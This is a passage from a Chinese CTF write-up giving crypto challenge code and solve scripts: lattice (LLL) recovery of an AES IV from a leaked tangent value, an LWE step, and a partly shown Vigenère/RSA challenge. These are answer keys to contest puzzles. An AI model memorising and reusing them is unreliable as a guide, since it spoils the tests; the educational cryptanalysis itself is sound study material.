72, 16], [20, 81, 1, 126], [91, 111, 69, 33], [56, 84, 65, 66], [47, 78, 43, 100], [43, 90, 80, 25], [46, 55, 10, 60], [116, 110, 49, 116], [72, 115, 38, 104], [79, 43, 74, 106], [86, 113, 84, 76], [102, 2, 119, 3], [126, 25, 83, 44], [37, 83, 46, 40], [13, 75, 101, 101], [76, 93, 3, 63], [69, 9, 84, 37], [103, 47, 106, 80], [72, 104, 85, 19], [124, 118, 34, 81], [57, 25, 52, 119], [44, 56, 63, 90], [123, 46, 124, 31], [19, 116, 23, 77], [126, 78, 37, 93], [34, 95, 43, 98], [37, 90, 32, 97], [106, 8, 80, 8], [90, 5, 113, 68], [99, 40, 39, 18], [90, 37, 48, 45], [56, 13, 76, 6], [68, 33, 52, 102], [62, 45, 29, 123], [100, 21, 73, 92], [92, 18, 118, 23], [84, 86, 42, 83], [107, 8, 71, 52], [114, 106, 78, 85], [10, 120, 115, 119], [27, 49, 124, 16], [65, 40, 48, 37], [69, 42, 8, 29], [35, 39, 55, 102], [58, 19, 41, 75], [17, 2, 113, 12], [8, 34, 72, 75], [91, 32, 19, 52], [62, 50, 109, 78], [9, 115, 35, 50], [42, 83, 78, 41], [34, 94, 97, 58], [56, 73, 25, 115], [55, 12, 16, 86], [97, 95, 30, 92], [47, 105, 70, 68], [50, 18, 51, 23], [46, 57, 80, 29], [4, 66, 123, 24], [55, 53, 26, 36], [71, 59, 104, 91], [94, 3, 1, 34], [57, 8, 85, 102], [89, 73, 115, 25], [13, 38, 81, 76], [104, 30, 81, 104], [55, 101, 95, 101], [69, 65, 5, 11], [123, 105, 84, 125], [38, 110, 4, 28], [112, 115, 92, 71], [90, 120, 112, 39], [50, 18, 107, 71], [95, 63, 118, 93], [93, 111, 59, 55], [17, 15, 2, 88], [78, 126, 37, 12], [56, 112, 53, 12], [65, 34, 82, 100], [9, 94, 72, 99], [78, 76, 43, 91], [7, 88, 107, 31], [43, 91, 97, 4], [113, 112, 36, 15], [8, 97, 23, 84], [65, 92, 31, 63], [54, 38, 119, 103], [89, 50, 57, 50], [61, 37, 87, 0], [21, 35, 44, 22], [20, 32, 95, 116], [10, 94, 103, 84], [59, 29, 7, 50], [98, 33, 87, 33], [7, 96, 36, 67], [85, 10, 35, 98], [65, 49, 19, 62], [56, 67, 14, 91], [30, 49, 111, 77], [121, 49, 108, 119], [89, 67, 115, 69], [65, 8, 0, 82], [117, 57, 117, 23], [23, 38, 2, 98], [60, 28, 94, 93], [23, 65, 8, 114], [121, 105, 122, 40], [120, 12, 21, 112], [55, 51, 2, 77], [48, 41, 113, 62], [66, 82, 117, 119], [4, 15, 5, 21], [41, 14, 12, 80], [23, 61, 106, 16], [23, 53, 122, 68], [6, 54, 5, 101], [69, 49, 7, 79], [17, 70, 64, 88], [103, 30, 76, 31], [108, 82, 90, 109], [55, 56, 113, 37], [93, 99, 126, 44], [1, 46, 105, 124], [55, 54, 35, 115], [0, 89, 53, 97], [67, 111, 107, 80], [92, 122, 40, 64], [75, 2, 126, 118], [90, 84, 43, 74], [101, 69, 60, 17], [104, 10, 4, 122], [94, 4, 115, 91], [15, 11, 111, 105], [9, 7, 32, 101], [77, 18, 55, 56], [66, 7, 117, 108], [116, 121, 33, 66], [32, 41, 83, 125], [60, 52, 70, 58], [125, 54, 93, 15], [70, 19, 10, 58], [83, 94, 61, 126], [95, 85, 80, 44], [25, 89, 117, 74], [12, 17, 63, 87], [118, 80, 96, 26], [6, 97, 79, 38], [97, 3, 107, 95], [7, 82, 106, 92], [83, 100, 119, 95], [81, 26, 99, 56], [25, 60, 51, 122], [56, 18, 22, 84], [9, 72, 107, 114], [80, 97, 92, 52], [108, 47, 58, 46], [9, 47, 7, 47], [115, 68, 91, 7], [14, 120, 87, 122], [97, 15, 40, 79], [5, 92, 85, 93], [4, 97, 73, 63], [25, 22, 92, 108], [88, 4, 34, 86], [0, 43, 21, 57], [67, 90, 36, 50], [15, 126, 37, 12], [92, 73, 96, 71], [76, 107, 27, 115], [79, 8, 68, 55], [38, 12, 120, 126], [54, 46, 7, 69], [72, 114, 93, 60], [59, 98, 27, 102], [50, 76, 87, 19], [77, 107, 29, 40], [36, 73, 21, 123], [36, 89, 82, 74], [24, 73, 118, 86], [58, 89, 115, 106], [12, 27, 33, 72], [28, 94, 21, 26], [0, 79, 48, 110], [72, 62, 82, 57], [65, 84, 114, 97], [80, 68, 52, 52], [119, 35, 103, 101], [10, 67, 68, 69], [101, 17, 54, 40], [98, 46, 21, 42], [30, 39, 56, 118], [27, 33, 77, 114], [66, 74, 61, 63], [23, 13, 14, 47], [88, 30, 122, 119], [15, 58, 55, 52], [56, 27, 47, 45], [119, 95, 59, 14], [84, 69, 5, 83], [21, 35, 39, 36], [10, 92, 68, 17], [79, 67, 111, 38], [36, 1, 4, 117], [117, 30, 5, 7], [112, 15, 115, 123], [54, 47, 18, 93], [102, 111, 3, 68], [91, 91, 5, 44], [123, 118, 57, 32], [12, 121, 31, 103], [114, 52, 105, 12], [100, 28, 117, 102], [51, 42, 12, 124], [47, 1, 42, 47], [28, 3, 22, 100], [103, 105, 119, 24], [101, 59, 13, 78], [79, 36, 61, 54], [11, 46, 75, 116], [31, 73, 118, 0], [92, 32, 0, 124], [77, 85, 25, 90], [29, 21, 74, 7], [3, 66, 11, 8], [112, 91, 50, 53], [45, 113, 99, 123], [35, 65, 85, 22], [108, 99, 42, 1], [103, 113, 116, 72], [125, 74, 112, 24], [75, 79, 80, 12], [83, 44, 94, 86], [64, 20, 0, 8], [104, 126, 31, 120], [85, 75, 61, 74], [36, 93, 36, 102], [70, 54, 101, 83], [90, 46, 109, 83], [112, 126, 114, 23], [16, 123, 97, 62], [118, 86, 108, 53], [99, 18, 2, 18], [103, 3, 38, 8], [99, 49, 123, 81], [37, 75, 89, 53], [34, 77, 27, 122], [29, 8, 40, 66], [119, 13, 64, 83], [4, 108, 116, 121], [49, 87, 1, 92], [15, 63, 80, 62], [27, 81, 100, 83], [7, 90, 16, 0], [13, 50, 61, 65], [51, 64, 76, 5], [55, 100, 106, 66], [52, 102, 105, 2], [49, 34, 89, 116], [24, 55, 11, 27], [91, 48, 73, 38], [27, 5, 1, 126], [66, 55, 80, 19], [52, 118, 104, 43], [36, 1, 111, 60], [65, 4, 34, 17], [54, 22, 0, 39], [52, 30, 64, 62], [26, 40, 32, 86], [93, 71, 41, 47], [77, 23, 15, 9], [11, 20, 51, 31], [64, 50, 37, 50], [17, 49, 80, 37], [119, 115, 115, 50], [20, 86, 27, 5], [101, 65, 17, 78], [56, 25, 125, 56], [16, 118, 2, 96], [114, 108, 69, 121], [14, 37, 76, 101], [113, 124, 121, 82], [43, 120, 35, 94], [82, 67, 23, 43], [9, 79, 47, 122], [39, 28, 110, 31], [35, 48, 27, 16], [72, 8, 115, 66], [54, 46, 122, 19], [77, 77, 30, 74], [58, 63, 81, 96], [6, 122, 75, 63], [115, 31, 119, 110], [82, 86, 89, 1], [79, 100, 6, 110], [117, 67, 15, 13], [4, 15, 63, 0], [106, 108, 122, 107], [34, 72, 0, 114], [20, 0, 32, 56], [121, 104, 66, 3], [86, 28, 76, 84], [85, 9, 60, 45], [95, 80, 78, 65], [39, 85, 50, 49], [42, 103, 36, 90], [70, 99, 116, 117], [34, 15, 40, 52], [24, 49, 19, 31], [98, 90, 95, 89], [63, 45, 40, 77], [114, 14, 30, 106], [10, 35, 116, 9], [103, 111, 112, 16], [71, 112, 71, 32], [77, 31, 105, 64], [84, 87, 24, 67], [1, 27, 123, 57], [104, 29, 87, 123], [110, 39, 67, 7], [28, 70, 108, 113], [96, 9, 101, 36], [13, 28, 6, 13], [69, 81, 89, 26], [79, 113, 77, 91], [112, 62, 104, 117], [109, 95, 55, 83], [78, 68, 98, 14], [73, 79, 96, 12], [108, 39, 97, 49], [27, 111, 106, 100], [82, 70, 9, 36], [48, 31, 90, 70], [99, 92, 45, 35], [55, 100, 31, 37], [75, 17, 69, 35], [12, 38, 119, 112], [103, 34, 63, 76], [26, 19, 91, 111], [74, 122, 12, 78], [64, 117, 16, 60], [2, 97, 122, 106], [62, 79, 56, 30], [71, 47, 13, 22], [38, 78, 116, 16], [87, 28, 94, 76], [77, 126, 94, 116], [83, 46, 104, 90], [5, 95, 13, 26], [47, 10, 46, 115], [82, 19, 91, 70], [111, 72, 49, 65], [18, 103, 59, 72], [17, 37, 56, 24], [19, 120, 24, 64], [28, 40, 11, 20], [18, 19, 80, 62], [37, 11, 74, 14], [109, 97, 75, 72], [116, 65, 52, 121], [95, 63, 82, 122], [88, 93, 54, 93], [77, 30, 65, 121], [99, 121, 42, 87], [62, 52, 44, 6], [79, 60, 55, 4], [96, 64, 6, 20], [94, 114, 90, 8], [123, 98, 29, 27], [116, 84, 31, 80], [9, 77, 45, 45], [120, 33, 63, 15], [51, 44, 66, 25], [2, 46, 72, 94], [107, 113, 50, 46], [115, 64, 126, 85], [64, 10, 28, 78], [84, 112, 64, 103], [59, 114, 15, 82], [65, 122, 104, 89], [113, 122, 21, 11], [69, 106, 19, 78], [42, 93, 125, 0], [7, 123, 82, 70], [103, 114, 62, 92], [15, 30, 78, 114], [4, 78, 111, 60], [40, 80, 34, 55], [3, 87, 120, 27], [122, 64, 3, 122], [24, 49, 31, 81], [26, 43, 100, 19], [52, 78, 2, 97], [116, 45, 15, 33], [21, 119, 92, 86], [28, 118, 71, 24], [106, 15, 0, 79], [36, 4, 52, 73], [22, 43, 8, 60], [96, 22, 9, 100], [19, 64, 26, 96], [97, 61, 22, 39], [6, 112, 76, 38], [58, 6, 97, 94], [103, 87, 87, 101], [17, 49, 80, 37], [117, 33, 26, 8], [59, 108, 78, 91], [113, 28, 30, 44], [119, 78, 72, 20], [49, 101, 77, 2], [26, 18, 35, 7], [34, 38, 99, 37], [45, 52, 90, 27], [108, 31, 118, 67], [3, 37, 29, 88], [111, 96, 12, 111], [91, 111, 106, 100], [52, 78, 117, 80], [14, 51, 87, 0], [1, 52, 116, 1], [117, 2, 33, 48], [57, 0, 48, 34], [59, 14, 84, 63], [82, 83, 8, 82], [58, 100, 32, 33], [75, 29, 112, 103], [0, 49, 45, 54], [94, 9, 51, 110], [54, 61, 27, 47], [88, 89, 23, 37], [73, 43, 0, 32], [123, 6, 35, 78], [73, 72, 119, 64], [81, 46, 11, 102], [42, 124, 47, 8], [50, 66, 3, 40], [116, 7, 51, 20], [47, 112, 99, 7], [42, 37, 86, 89], [18, 74, 78, 101], [57, 85, 75, 7], [26, 90, 35, 10], [72, 126, 10, 77], [55, 12, 5, 78], [37, 87, 85, 96], [91, 9, 114, 68], [79, 76, 44, 20], [84, 52, 63, 56], [95, 9, 22, 117], [96, 38, 50, 67], [43, 114, 45, 56], [94, 21, 74, 107], [92, 82, 81, 71], [40, 10, 10, 90], [20, 18, 15, 56], [72, 2, 30, 22], [50, 31, 123, 20], [85, 40, 115, 115], [93, 1, 48, 47], [111, 118, 45, 34], [9, 122, 37, 121], [60, 27, 77, 41], [122, 38, 22, 39], [115, 66, 74, 126], [77, 67, 90, 78], [96, 3, 53, 52], [5, 26, 120, 101], [45, 100, 72, 6], [106, 56, 87, 77], [52, 68, 102, 95], [1, 13, 36, 33], [58, 27, 35, 8], [52, 5, 38, 35], [102, 82, 63, 47], [24, 71, 119, 43], [11, 36, 90, 13], [11, 93, 27, 23], [4, 107, 26, 125], [85, 9, 5, 13], [116, 25, 55, 119], [73, 82, 73, 2], [40, 123, 77, 41], [10, 98, 51, 111], [23, 79, 120, 54], [56, 18, 22, 84], [61, 115, 51, 109], [33, 5, 12, 121], [8, 81, 35, 70], [22, 39, 103, 2], [38, 74, 66, 126], [83, 20, 117, 85], [8, 32, 91, 98], [37, 31, 94, 119], [7, 30, 45, 43], [68, 16, 124, 97], [86, 124, 37, 21], [29, 101, 15, 30], [27, 31, 52, 45], [47, 37, 102, 3], [117, 49, 54, 89], [48, 94, 126, 66], [42, 115, 63, 104], [14, 74, 6, 112], [68, 125, 4, 5], [66, 3, 78, 52], [108, 33, 6, 77], [77, 99, 16, 52], [61, 78, 73, 70], [108, 106, 124, 0], [23, 35, 119, 118], [125, 124, 37, 65], [69, 30, 61, 110], [77, 10, 120, 118], [53, 121, 24, 30], [87, 32, 29, 63], [54, 64, 1, 3], [16, 59, 104, 25], [30, 6, 59, 102], [43, 120, 35, 94], [89, 13, 69, 39], [87, 78, 100, 14], [83, 17, 14, 4], [24, 49, 31, 81], [73, 32, 72, 10], [0, 22, 61, 54], [81, 42, 70, 13], [108, 56, 52, 2], [25, 99, 116, 72], [66, 23, 18, 102], [121, 115, 47, 12], [96, 37, 123, 48], [64, 69, 4, 39], [78, 38, 124, 31], [27, 69, 10, 70], [5, 29, 2, 85], [30, 45, 56, 7], [31, 25, 120, 61], [36, 89, 89, 118], [98, 63, 18, 21], [121, 83, 36, 57], [60, 5, 86, 17], [121, 55, 117, 58], [12, 96, 4, 27], [119, 63, 124, 37], [96, 27, 45, 91], [42, 119, 8, 103], [104, 42, 68, 37], [104, 55, 41, 38], [120, 3, 50, 87], [120, 121, 20, 67], [58, 123, 50, 28], [103, 62, 58, 20], [97, 27, 89, 102], [7, 51, 56, 108], [73, 60, 10, 77], [56, 72, 103, 69], [101, 89, 18, 66], [115, 35, 80, 36], [98, 103, 39, 63], [29, 126, 67, 76], [27, 97, 15, 79], [36, 6, 17, 90], [126, 54, 101, 42], [115, 66, 74, 126], [78, 80, 62, 83], [60, 11, 31, 88], [16, 73, 108, 13]]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">encrypted = AES.new(key=key, iv=iv, mode=AES.MODE_CBC).encrypt(<span class="string">b&quot;&quot;</span>.join([pad(i.encode(), <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(leak)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"><span class="built_in">print</span>(encrypted)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">-3.257518803980229925210589904230583482986646342139415561576950148286382674434770529248486501793457710730252401258721482142654716015216299244487794967600132597049154513815052213387666360825101667524635777006510550117512116441539852315185793280311905620746025669520152068447372368293640072502196959919309286241</span></span><br><span class="line"><span class="string">b&#x27;\x8fj\x94\x98-\x1fd\xd5\x89\xbe\xa9*Tu\x90\xb7&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\x9fT@\xbc\x82\x8esQ\x1e\xd8\x1d\xdb\x9b\xb4\xf8rU\xc8\xa0\xcb\xaf H\xa9.\x04\x1e\xd2\x92\x1f\x0fBja-\x965x\xa8@\xc9x\xf9\xaf\x87\xd1\xa5&#125;\xfc\x1b\xe0#\xc3m\xc9\x8973\x1c\x1f\x13\x8f\xb2a\xae\xa9]\xb9\xc2\xe8\x83A\x80\x13g\xc9a\x1c&lt;\x8a\x9c&amp;\xd9\xbd\x06\xef\xba9\xb0\x03\x9f\x022\xc9\x13\x9a\xffXPG\xc6o\xc0\xeaV7)XG9L\x84N7U\xe3Wn0G\x8e\xd3\x04(\n\x08\xb9\x17\xe6\xf1\xaa\xb7\x8a@$\x16\x13\x06A\x00\xc9Z\xdf\x7fQ\xc9\x08\xb4\xf3P\xfcpe\xe2\xeb\x96\x0e(-\xde\x17\xd1\x01\x1c_\x82\x8b\x9fw\xc8\x86\xfbw\xb5\xf7\xd0\xc8\x1784\xe3?\x00\x0b.)\xb7\xbc\x8e&#123;\xe0\xae\x8d$\x0f\x19\&#x27;\xb6\xee@d\x00\xd9\x84\x8c\x0e\xa3,\xc6a\xa3\xba*1\xfd&lt;\xfd\x18\xd6\x9e\x8c4\x8e#\xfd\xbd&amp;0R\xeddE,\xed\xb6\x1e\x00\x11\xa6K\xd3\x1dT\x8c5\x8e\x00\xea\x10\xe9\&#x27;u&quot;B#\xa1#\xd8\xe3\xf5j\xbc\x94M\xda\xe3\xcb*\xf0W1\xa0\x80\x1d\xfc\xbfo\x01?(da\r\xb6\x86\xd0\x90\x88Z\xa1`B\x89\x89\x89\xb3v\xa5\xf0\xe0\x0c\x8e\xcc+P\xfc\xfd#\x83\xe9\x93\x96\n\xf2\xa5\xfb\xc3\xc5\xaa\x9e\x89\x93\xb6\xf5\xea\x8c%NY\xc3\x0eR\xfas\xa1\x13\xf2/*\xce\x8b_:_r\xeb\xbe\x0b\x8a\x8c\x97\x7f|m&#125;\xae\xa9I\x95\xcc\xe7\x80\xa5yC4\x1f5\xa4P\xc5\xbf.\xf9V\xe8|\xbb\xc3\xcb\x98&amp;\&#x27;JB\x99\x94\xc0\r$\x0b\xbe48u\xeb\xca\xa1\xfbb\xd8_R\x97\x8e\xaeI\xfc\xc2\xb2\xd2#@\xec\x16\xf1\xd7eCQ\x1cO\x13\xca\xb5\xd3\x1a\xb1\xf1_D\x80\x06\xa5\xbe\xbev\xbd\xd6\xbb\x9a\xc9x\x9cf:\xcb&gt;\xa2\xe1\xcad\xde]aw\xa0\xdc\xb2\xb3&#123;+\x85\x8d\x8b\xc5\rT\xcc\xd9X\xd5\x9b\r&lt;\x99m\xb8b6s\xbfp\x0eo~\xe9&amp;\xb2&#123;\xbe\xee\x93\xd2N1\\\x94\x968IWO7\xcb\xb6e\x80\xf7\x9air\xb2~\x17\x1cF\x0f\x82T]RBX\xdex\x13\x85\xfa\xcd-\xce\xdc\xe4\xe5^\x99u\xb5\x01\xd0-\xc3C\xcd\xc4y6\xb7\x9d|L1\xe74\xf7\x8cH\xe9\xa9\xfav\n\xec;\xf2\xa2w\xfb\x13_b\r)z!\xa3\xc8\xa8\xc2\xd2\x10\x00\x11\x11\r\xb2&amp;\xfb\x04&amp;\x84&quot;&gt;x6l[\x06n&gt;\xa0\xbe\x9c`\xa7\x9e\xe0\xfb\x85\x91\xc4,\xcf\xac\xe11@a\xed3@\xfd&#125;\x8e\xfaTp\xcb7\xe7\xbf\xd4\xe0~b\xd9\xe0&lt;\xba\x81\xd4&quot;e\xfc\x939|j#0H\x86\xf8\x0b\x03\xd2\xe8\xf5\xe55\xdc\xc8\x06\\\xb7)\xcc\x9b\&#x27;\xf12&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第一部分是一个lwe，扔给gpt问一下。直接遍历所有可能的t组合求解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] Best t found: (26, 24, 54)</span><br><span class="line">[+] Decrypted hint: Congratulations,you&#x27;re amazing!Here&#x27;s a hint: sin(iv) + leak * cos(iv) = 0, keep it up! @V@</span><br></pre></td></tr></table></figure>

<p>得到hint</p>
<p>sin(iv)+leak$*$cos(iv)&#x3D;0,变式一下即可得到</p>
<p>tan(iv)&#x3D;-leak.</p>
<p>即</p>
<p>iv&#x3D;arctan(-leak)+2k$\pi$</p>
<p>很经典的板子题了，可以参考<a href="https://tangcuxiaojikuai.xyz/post/3f46adc9.html">2023-ASISCTF-finals-wp-crypto | 糖醋小鸡块的blog</a></p>
<p>造出格<br>$$<br>\left[<br> \begin{matrix}<br>   arctan(-leak) &amp; 0 &amp; 0 \<br>   \pi &amp; 1 &amp; 0 \<br>   1 &amp; 0 &amp; 1<br>  \end{matrix}<br>  \right] \tag{3}<br>$$<br>此时我们需要分析一下leak，根据bitlength确定精度为1019，将其乘入格来配平进行规约。</p>
<p>不过精度好像设成其他数也能出？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">leak =-<span class="number">3.257518803980229925210589904230583482986646342139415561576950148286382674434770529248486501793457710730252401258721482142654716015216299244487794967600132597049154513815052213387666360825101667524635777006510550117512116441539852315185793280311905620746025669520152068447372368293640072502196959919309286241</span></span><br><span class="line">approx_iv = arctan(-leak)</span><br><span class="line">precision = <span class="number">1000</span></span><br><span class="line">T = <span class="number">2</span>**(precision)</span><br><span class="line">L = Matrix(QQ,<span class="number">3</span>,<span class="number">3</span>,[[(approx_iv)*T,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">                [(pi.n(precision))*T,<span class="number">1</span>,<span class="number">0</span>],</span><br><span class="line">                [T,<span class="number">0</span>,<span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line">res = L.LLL()</span><br><span class="line">iv = long_to_bytes(<span class="built_in">abs</span>(<span class="built_in">int</span>(res[<span class="number">0</span>][-<span class="number">1</span>])))</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;\x8fj\x94\x98-\x1fd\xd5\x89\xbe\xa9*Tu\x90\xb7&#x27;</span></span><br><span class="line">enc = <span class="string">b&#x27;\x9fT@\xbc\x82\x8esQ\x1e\xd8\x1d\xdb\x9b\xb4\xf8rU\xc8\xa0\xcb\xaf H\xa9.\x04\x1e\xd2\x92\x1f\x0fBja-\x965x\xa8@\xc9x\xf9\xaf\x87\xd1\xa5&#125;\xfc\x1b\xe0#\xc3m\xc9\x8973\x1c\x1f\x13\x8f\xb2a\xae\xa9]\xb9\xc2\xe8\x83A\x80\x13g\xc9a\x1c&lt;\x8a\x9c&amp;\xd9\xbd\x06\xef\xba9\xb0\x03\x9f\x022\xc9\x13\x9a\xffXPG\xc6o\xc0\xeaV7)XG9L\x84N7U\xe3Wn0G\x8e\xd3\x04(\n\x08\xb9\x17\xe6\xf1\xaa\xb7\x8a@$\x16\x13\x06A\x00\xc9Z\xdf\x7fQ\xc9\x08\xb4\xf3P\xfcpe\xe2\xeb\x96\x0e(-\xde\x17\xd1\x01\x1c_\x82\x8b\x9fw\xc8\x86\xfbw\xb5\xf7\xd0\xc8\x1784\xe3?\x00\x0b.)\xb7\xbc\x8e&#123;\xe0\xae\x8d$\x0f\x19\&#x27;\xb6\xee@d\x00\xd9\x84\x8c\x0e\xa3,\xc6a\xa3\xba*1\xfd&lt;\xfd\x18\xd6\x9e\x8c4\x8e#\xfd\xbd&amp;0R\xeddE,\xed\xb6\x1e\x00\x11\xa6K\xd3\x1dT\x8c5\x8e\x00\xea\x10\xe9\&#x27;u&quot;B#\xa1#\xd8\xe3\xf5j\xbc\x94M\xda\xe3\xcb*\xf0W1\xa0\x80\x1d\xfc\xbfo\x01?(da\r\xb6\x86\xd0\x90\x88Z\xa1`B\x89\x89\x89\xb3v\xa5\xf0\xe0\x0c\x8e\xcc+P\xfc\xfd#\x83\xe9\x93\x96\n\xf2\xa5\xfb\xc3\xc5\xaa\x9e\x89\x93\xb6\xf5\xea\x8c%NY\xc3\x0eR\xfas\xa1\x13\xf2/*\xce\x8b_:_r\xeb\xbe\x0b\x8a\x8c\x97\x7f|m&#125;\xae\xa9I\x95\xcc\xe7\x80\xa5yC4\x1f5\xa4P\xc5\xbf.\xf9V\xe8|\xbb\xc3\xcb\x98&amp;\&#x27;JB\x99\x94\xc0\r$\x0b\xbe48u\xeb\xca\xa1\xfbb\xd8_R\x97\x8e\xaeI\xfc\xc2\xb2\xd2#@\xec\x16\xf1\xd7eCQ\x1cO\x13\xca\xb5\xd3\x1a\xb1\xf1_D\x80\x06\xa5\xbe\xbev\xbd\xd6\xbb\x9a\xc9x\x9cf:\xcb&gt;\xa2\xe1\xcad\xde]aw\xa0\xdc\xb2\xb3&#123;+\x85\x8d\x8b\xc5\rT\xcc\xd9X\xd5\x9b\r&lt;\x99m\xb8b6s\xbfp\x0eo~\xe9&amp;\xb2&#123;\xbe\xee\x93\xd2N1\\\x94\x968IWO7\xcb\xb6e\x80\xf7\x9air\xb2~\x17\x1cF\x0f\x82T]RBX\xdex\x13\x85\xfa\xcd-\xce\xdc\xe4\xe5^\x99u\xb5\x01\xd0-\xc3C\xcd\xc4y6\xb7\x9d|L1\xe74\xf7\x8cH\xe9\xa9\xfav\n\xec;\xf2\xa2w\xfb\x13_b\r)z!\xa3\xc8\xa8\xc2\xd2\x10\x00\x11\x11\r\xb2&amp;\xfb\x04&amp;\x84&quot;&gt;x6l[\x06n&gt;\xa0\xbe\x9c`\xa7\x9e\xe0\xfb\x85\x91\xc4,\xcf\xac\xe11@a\xed3@\xfd&#125;\x8e\xfaTp\xcb7\xe7\xbf\xd4\xe0~b\xd9\xe0&lt;\xba\x81\xd4&quot;e\xfc\x939|j#0H\x86\xf8\x0b\x03\xd2\xe8\xf5\xe55\xdc\xc8\x06\\\xb7)\xcc\x9b\&#x27;\xf12&#x27;</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">decrypted = cipher.decrypt(enc)</span><br><span class="line"><span class="keyword">if</span> decrypted[<span class="number">0</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>):</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(decrypted), <span class="number">16</span>):</span><br><span class="line">        flag += <span class="built_in">chr</span>(decrypted[i])</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>



<h1 id="3，因式分解"><a href="#3，因式分解" class="headerlink" title="3，因式分解"></a>3，因式分解</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> hint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> encrypt</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">dicts = string.ascii_lowercase +<span class="string">&quot;&#123;=&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">key = (<span class="string">&#x27;&#x27;</span>.join([random.choice(dicts) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)])) * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(hint) == <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(key) == <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipher = encrypt(hint, key)    <span class="comment">#Vigenere</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line"></span><br><span class="line"><span class="comment"># cp=wmaunapgimjfpopeblvup=aywqygb</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,a,b,c</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">256</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">_q = <span class="built_in">int</span>(<span class="built_in">bin</span>(q)[<span class="number">2</span>:][::-<span class="number">1</span>] , <span class="number">2</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 7688109450918412752403544831281002390909833419780604228031807748258766149305710928557842935597759373483911172486806200079137977020089610947423466744079981</span></span><br><span class="line"><span class="string">c = 6470273779347221033316093386019083111753019159457126878637258794718443144439812725263309232245307744208957171971247518708231996986359926490571921925899978</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> a**<span class="number">3</span>+b**<span class="number">3</span>+c**<span class="number">3</span> == <span class="number">3</span>*a*b*c</span><br><span class="line">gift = secert**<span class="number">3</span> - <span class="number">9</span>*secert + <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(gift)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="number">3</span>*(p ^ _q) == a + b + c</span><br><span class="line"></span><br><span class="line"><span class="comment">#16174454302590604301534105361719250538317088773024913985896374029052621214070408075926265229111851489902642328975085914458074453963086159246933939207642987161923181946601656883349077418380372857072224674380642689142603970810010050</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>爆破下维吉尼亚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义字符集</span></span><br><span class="line">dicts = string.ascii_lowercase + <span class="string">&quot;&#123;=&#125;&quot;</span></span><br><span class="line">dicts_len = <span class="built_in">len</span>(dicts)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vigenere_decrypt</span>(<span class="params">cipher, key</span>):</span><br><span class="line">    plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">        c = cipher[i]</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> dicts:</span><br><span class="line">            k = dicts.find(key[i % <span class="built_in">len</span>(key)])</span><br><span class="line">            